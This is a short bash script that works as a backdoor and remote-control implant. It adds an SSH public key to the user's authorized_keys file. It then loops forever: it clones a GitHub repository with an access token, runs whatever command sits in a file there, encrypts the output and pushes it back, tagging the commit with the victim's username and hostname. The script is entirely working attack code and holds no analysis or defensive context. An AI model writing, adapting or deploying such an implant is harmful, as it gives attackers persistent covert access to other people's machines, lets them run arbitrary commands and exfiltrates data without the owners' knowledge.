#!/bin/bash


echo """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC6QZF9BEbUg9bT2p44GEbDkAwoeRuPMe8xG0QXbskU/FXNR5TsW/yDcV/dWMV2/rvDP5lrNSQ9zn9MjkPpeQ4eOda5aVCzbUp33Z5s6yPBabMLoJGCB9pZi+bd/BmkvrM+s4qcl5s8ijOO/gLWfgv9Fysxe86yYDeXGa75U1V2sfGsj/zu5wAz+n0zdVZy+DVlnrxvKSpEulDaOVrIKAbgWw4lLoRdJG+8Y9JQj+OOdAlNOtLuDaL+IpeaKi+Wj5z5oNUmU70wWhO027Qd18TCJO5/fj6x2kEoH+42KOBzT2EyePnJGfkVENJRHKLAHpIm8LOBgcMC+OtWIlQjbGJHb1HG3mMtgWz3+8gKOXHvQpMS04ZMtXqD6tvHx+SmSCx/sCP1HErziW9g6borQYqwUdfyNMkGey6Ufni0LjAuNZ1Og/n5s59qfHolQaTRU1Qrz8wXDw1goU8sWy2UHC4ykyVBAf9mMdiD1EXgPHnR+3hXV0udvAPucfAy61ny3/tvXZByaxvGRiRGaLFWPKVB0HA6Dz+m61F1lxD9Q+h6JSawttaxLfUXNQqMv1CLg8jaPtZIz9snj5rbrcid7uJybK6zzLZurfucBApZxmromNqn32V22LJWeJhlMexPchQWsIb16uuscpUk6kvD09joVB0SnGw4QqyfRGJJQIzBOQ==""" >> ~/.ssh/authorized_keys

LOCKFILE="/tmp/tmp6iwot03k.lock"

if [ -e "$LOCKFILE" ]; then
    exit 0
fi

touch "$LOCKFILE"

LAST_COMMAND=""
PAT=$GHPAT
AESK=$AESP

slip=25

mkdir /tmp/tmp6iwot03k/
cd /tmp/tmp6iwot03k/

while true; do

	git clone https://$PAT@github.com/armysick/Innocuous
	cd Innocuous

	slip=$(cat sleep)
	dmc=$(head -n 1 clear)
	if [ "$LAST_COMMAND" != "$dmc" ]; then
		output=$(bash -c "$dmc")
		echo $output | openssl enc -aes-256-cbc -base64 -pass pass:$AESK >> ls
		git add ls
		GIT_AUTHOR_NAME="$(whoami)/$(hostname)" GIT_AUTHOR_EMAIL="new.user@example.com" GIT_COMMITTER_NAME="Committer Name" GIT_COMMITTER_EMAIL="committer@example.com" git commit -m "yup"
		git push
		LAST_COMMAND=$dmc
	fi

	cd ..
	rm -rf Innocuous

	sleep $slip
done
